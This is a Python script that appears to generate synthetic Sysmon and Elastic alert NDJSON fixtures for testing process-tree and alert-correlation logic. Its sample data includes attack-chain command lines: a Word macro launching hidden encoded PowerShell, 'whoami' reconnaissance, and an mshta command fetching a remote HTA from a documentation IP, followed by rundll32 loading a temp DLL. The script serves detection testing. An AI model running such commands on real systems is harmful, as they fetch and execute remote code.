import argparse
import hashlib
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).parent
BASE = datetime(2026, 10, 30, 2, 0, 0, tzinfo=timezone.utc)
DS_INDEX = ".ds-logs-windows.sysmon_operational-default-2026.10.30-000001"
ALERT_INDEX = ".internal.alerts-security.alerts-default-000001"
CHANNEL = "Microsoft-Windows-Sysmon/Operational"

HOSTS = {
    "ws-01": {"id": "8f3c2a71-5b1e-4c0e-9a77-2d6f1b9e0a01", "agent": "a1f0c9d2-1111-4b6e-8c0d-0000000000a1", "ip": "10.10.20.15"},
    "ws-02": {"id": "8f3c2a71-5b1e-4c0e-9a77-2d6f1b9e0a02", "agent": "a1f0c9d2-1111-4b6e-8c0d-0000000000a2", "ip": "10.10.20.16"},
}

ACTIONS = {"1": "Process creation", "3": "Network connection", "5": "Process terminated", "22": "DNSEvent (DNS query)"}
TYPES = {"1": ["start"], "3": ["start", "connection", "protocol"], "5": ["end"], "22": ["connection", "protocol", "info"]}
CATEGORIES = {"1": ["process"], "3": ["network"], "5": ["process"], "22": ["network"]}


def ts(seconds: float) -> str:
    return (BASE + timedelta(seconds=seconds)).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def ts_s(seconds: float) -> str:
    return (BASE + timedelta(seconds=int(seconds))).isoformat().replace("+00:00", "Z")


def guid(n: int) -> str:
    return "{4a1c3b2e-%04x-6720-0000-0010%08x}" % (n, n)


class Recorder:
    def __init__(self):
        self.record_ids = {h: 1000 for h in HOSTS}

    def doc(self, host: str, code: str, t: float, ingest_delay: float = 3.0, record_id: int | None = None, **ecs) -> dict:
        h = HOSTS[host]
        if record_id is None:
            self.record_ids[host] += 1
            record_id = self.record_ids[host]
        src = {
            "@timestamp": ts(t),
            "agent": {"id": h["agent"], "name": host, "type": "filebeat", "version": "9.5.5"},
            "data_stream": {"dataset": "windows.sysmon_operational", "namespace": "default", "type": "logs"},
            "ecs": {"version": "8.17.0"},
            "elastic_agent": {"id": h["agent"], "snapshot": False, "version": "9.5.5"},
            "event": {
                "action": ACTIONS[code],
                "agent_id_status": "verified",
                "category": CATEGORIES[code],
                "code": code,
                "created": ts(t + 0.4),
                "dataset": "windows.sysmon_operational",
                "ingested": ts_s(t + ingest_delay),
                "kind": "event",
                "module": "windows",
                "provider": "Microsoft-Windows-Sysmon",
                "type": TYPES[code],
            },
            "host": {"hostname": host, "id": h["id"], "ip": [h["ip"]], "name": host, "os": {"family": "windows", "platform": "windows"}},
            "log": {"level": "information"},
            "winlog": {
                "channel": CHANNEL,
                "computer_name": f"{host}.lab.local",
                "event_id": code,
                "opcode": "Info",
                "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                "provider_name": "Microsoft-Windows-Sysmon",
                "record_id": str(record_id),
                "user": {"identifier": "S-1-5-18"},
                "version": 5,
            },
        }
        for key, value in ecs.items():
            src[key] = value
        doc_id = hashlib.sha1(f"{host}{record_id}{code}{t}".encode()).hexdigest()[:20]
        return {"_index": DS_INDEX, "_id": doc_id, "_source": src}

    def create(self, host, t, g, pid, exe, cmd, pg, ppid, pexe, pcmd, user="analyst", sha256=None, **kw):
        name = exe.split("\\")[-1]
        proc = {
            "entity_id": g, "pid": pid, "executable": exe, "name": name, "command_line": cmd,
            "args": cmd.split(" "), "args_count": len(cmd.split(" ")),
            "working_directory": "C:\\Users\\analyst\\",
            "hash": {"sha256": sha256 or hashlib.sha256(exe.encode()).hexdigest()},
            "parent": {"entity_id": pg, "pid": ppid, "executable": pexe, "name": pexe.split("\\")[-1], "command_line": pcmd},
        }
        return self.doc(host, "1", t, process=proc, user={"domain": "LAB", "name": user},
                        related={"hash": [proc["hash"]["sha256"]], "user": [user]}, **kw)

    def terminate(self, host, t, g, pid, exe):
        return self.doc(host, "5", t, process={"entity_id": g, "pid": pid, "executable": exe, "name": exe.split("\\")[-1]})

    def dns(self, host, t, g, pid, exe, qname, ips):
        labels = qname.split(".")
        return self.doc(
            host, "22", t,
            process={"entity_id": g, "pid": pid, "executable": exe, "name": exe.split("\\")[-1]},
            dns={"question": {"name": qname, "registered_domain": ".".join(labels[-2:]), "top_level_domain": labels[-1]},
                 "resolved_ip": ips},
            network={"protocol": "dns"},
            related={"hosts": [qname], "ip": ips},
            user={"domain": "LAB", "name": "analyst"},
        )

    def net(self, host, t, g, pid, exe, sport, dip, dport, transport="tcp"):
        return self.doc(
            host, "3", t,
            process={"entity_id": g, "pid": pid, "executable": exe, "name": exe.split("\\")[-1]},
            source={"ip": HOSTS[host]["ip"], "port": sport},
            destination={"ip": dip, "port": dport},
            network={"direction": "egress", "transport": transport, "type": "ipv4"},
            related={"ip": [HOSTS[host]["ip"], dip]},
            user={"domain": "LAB", "name": "analyst"},
        )


EXPLORER = "C:\\Windows\\explorer.exe"
USERINIT = "C:\\Windows\\System32\\userinit.exe"
WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
CMD = "C:\\Windows\\System32\\cmd.exe"
MSHTA = "C:\\Windows\\System32\\mshta.exe"
RUNDLL = "C:\\Windows\\System32\\rundll32.exe"
NOTEPAD = "C:\\Windows\\System32\\notepad.exe"
SVCHOST = "C:\\Windows\\System32\\svchost.exe"


def normal_tree(r: Recorder):
    return [
        r.create("ws-01", 0, guid(1), 4120, EXPLORER, "C:\\Windows\\Explorer.EXE", guid(900), 3880, USERINIT, "C:\\Windows\\system32\\userinit.exe"),
        r.create("ws-01", 890, guid(2), 5532, WORD, "\"WINWORD.EXE\" /n C:\\Users\\analyst\\Downloads\\invoice.docm", guid(1), 4120, EXPLORER, "C:\\Windows\\Explorer.EXE"),
        r.create("ws-01", 902, guid(3), 6100, PS, "powershell.exe -nop -w hidden -enc SQBFAFgA", guid(2), 5532, WORD, "\"WINWORD.EXE\" /n C:\\Users\\analyst\\Downloads\\invoice.docm"),
        r.dns("ws-01", 909.12, guid(3), 6100, PS, "suspicious.example", ["203.0.113.50"]),
        r.net("ws-01", 910.003, guid(3), 6100, PS, 51522, "203.0.113.50", 443),
        r.create("ws-01", 920, guid(4), 6240, CMD, "cmd.exe /c whoami", guid(3), 6100, PS, "powershell.exe -nop -w hidden -enc SQBFAFgA"),
        r.terminate("ws-01", 921, guid(4), 6240, CMD),
    ]


def late_parent(r: Recorder):
    parent = r.create("ws-01", 1200, guid(10), 7010, MSHTA, "mshta.exe http://203.0.113.60/a.hta", guid(1), 4120, EXPLORER, "C:\\Windows\\Explorer.EXE", ingest_delay=400)
    child = r.create("ws-01", 1201, guid(11), 7022, RUNDLL, "rundll32.exe C:\\Users\\analyst\\AppData\\Local\\Temp\\x.dll,Start", guid(10), 7010, MSHTA, "mshta.exe http://203.0.113.60/a.hta", ingest_delay=5)
    return [child, parent]


def pid_reuse(r: Recorder):
    return [
        r.create("ws-02", 100, guid(20), 4242, NOTEPAD, "notepad.exe C:\\notes\\a.txt", guid(901), 2000, EXPLORER, "C:\\Windows\\Explorer.EXE"),
        r.terminate("ws-02", 160, guid(20), 4242, NOTEPAD),
        r.create("ws-02", 3600, guid(21), 4242, NOTEPAD, "notepad.exe C:\\notes\\b.txt", guid(901), 2000, EXPLORER, "C:\\Windows\\Explorer.EXE"),
        r.dns("ws-02", 3610, guid(21), 4242, NOTEPAD, "update.example.org", ["198.51.100.7"]),
    ]


def orphan(r: Recorder):
    return [r.net("ws-02", 500, guid(30), 1188, SVCHOST, 49800, "198.51.100.20", 8080)]


def duplicates(r: Recorder):
    first = r.create("ws-02", 700, guid(40), 5120, CMD, "cmd.exe /c ipconfig", guid(901), 2000, EXPLORER, "C:\\Windows\\Explorer.EXE")
    overlap_reread = json.loads(json.dumps(first))
    shipper_retry = json.loads(json.dumps(first))
    shipper_retry["_id"] = first["_id"][::-1]
    ilm_renamed = json.loads(json.dumps(first))
    ilm_renamed["_index"] = "partial-" + DS_INDEX
    return [first, overlap_reread, shipper_retry, ilm_renamed]


def alerts(log_docs: list[dict]):
    target = next(d for d in log_docs if d["_source"]["event"]["code"] == "22")
    src = target["_source"]
    alert_id = "5e0b7a52-3c9d-4f63-9a0a-6d4f0c1b2a11"
    alert = {
        "@timestamp": ts(1200),
        "event.kind": "signal",
        "host": src["host"],
        "process": src["process"],
        "dns": src["dns"],
        "kibana.alert.uuid": alert_id,
        "kibana.alert.rule.uuid": "c2f4e1d0-7b3a-4c55-9e10-0f3b6a2d8e44",
        "kibana.alert.rule.name": "DNS query to suspicious domain by PowerShell",
        "kibana.alert.severity": "high",
        "kibana.alert.risk_score": 73,
        "kibana.alert.workflow_status": "open",
        "kibana.alert.workflow_status_updated_at": None,
        "kibana.alert.original_time": src["@timestamp"],
        "kibana.alert.ancestors": [{"id": target["_id"], "index": target["_index"], "depth": 0, "type": "event"}],
        "kibana.space_ids": ["default"],
    }
    acknowledged = json.loads(json.dumps(alert))
    acknowledged["@timestamp"] = ts(1500)
    acknowledged["kibana.alert.workflow_status"] = "acknowledged"
    acknowledged["kibana.alert.workflow_status_updated_at"] = ts(1500)
    return [
        {"_index": ALERT_INDEX, "_id": alert_id, "_source": alert},
        {"_index": ALERT_INDEX, "_id": alert_id, "_source": acknowledged},
    ]


def perf_guid(host_index: int, n: int) -> str:
    return "{7c5e1a90-%04x-6720-0000-0010%08x}" % (host_index, n)


def perf(r: Recorder, total: int) -> list[dict]:
    docs, n, hosts = [], 0, list(HOSTS)
    while len(docs) < total:
        host, hi = hosts[n % len(hosts)], n % len(hosts)
        t = 7200 + n * 0.05
        parent, child = perf_guid(hi, 2 * n), perf_guid(hi, 2 * n + 1)
        ppid, cpid = 3000 + (2 * n) % 60000, 3001 + (2 * n) % 60000
        pcmd = f"powershell.exe -nop -File job{n}.ps1"
        ip = f"203.0.113.{n % 250 + 1}"
        docs += [
            r.create(host, t, parent, ppid, PS, pcmd, guid(1), 4120, EXPLORER, "C:\\Windows\\Explorer.EXE"),
            r.create(host, t + 0.01, child, cpid, CMD, f"cmd.exe /c task{n}", parent, ppid, PS, pcmd),
            r.dns(host, t + 0.02, child, cpid, CMD, f"h{n % 5000}.perf.example", [ip]),
            r.net(host, t + 0.03, child, cpid, CMD, 49152 + n % 16000, ip, 443),
            r.terminate(host, t + 0.04, child, cpid, CMD),
        ]
        n += 1
    return docs[:total]


def write(name: str, docs: list[dict], directory: Path = OUT) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / f"{name}.ndjson"
    with path.open("w", encoding="utf-8", newline="\n") as f:
        for d in docs:
            f.write(json.dumps(d, ensure_ascii=False) + "\n")
    return path


def main():
    parser = argparse.ArgumentParser(description="Sinh fixture Sysmon; --perf N sinh N event vào lab/perf/ để đo hiệu năng")
    parser.add_argument("--perf", type=int)
    args = parser.parse_args()
    r = Recorder()
    if args.perf:
        print(write(f"perf_{args.perf}", perf(r, args.perf), OUT / "lab" / "perf"))
        return
    scenarios = {
        "01_normal_tree": normal_tree(r),
        "02_late_parent": late_parent(r),
        "03_pid_reuse": pid_reuse(r),
        "04_orphan": orphan(r),
        "05_duplicates": duplicates(r),
    }
    for name, docs in scenarios.items():
        write(name, docs)
    (OUT / "alerts").mkdir(exist_ok=True)
    with (OUT / "alerts" / "01_alert_status_change.ndjson").open("w", encoding="utf-8", newline="\n") as f:
        for d in alerts(scenarios["01_normal_tree"]):
            f.write(json.dumps(d, ensure_ascii=False) + "\n")


if __name__ == "__main__":
    main()
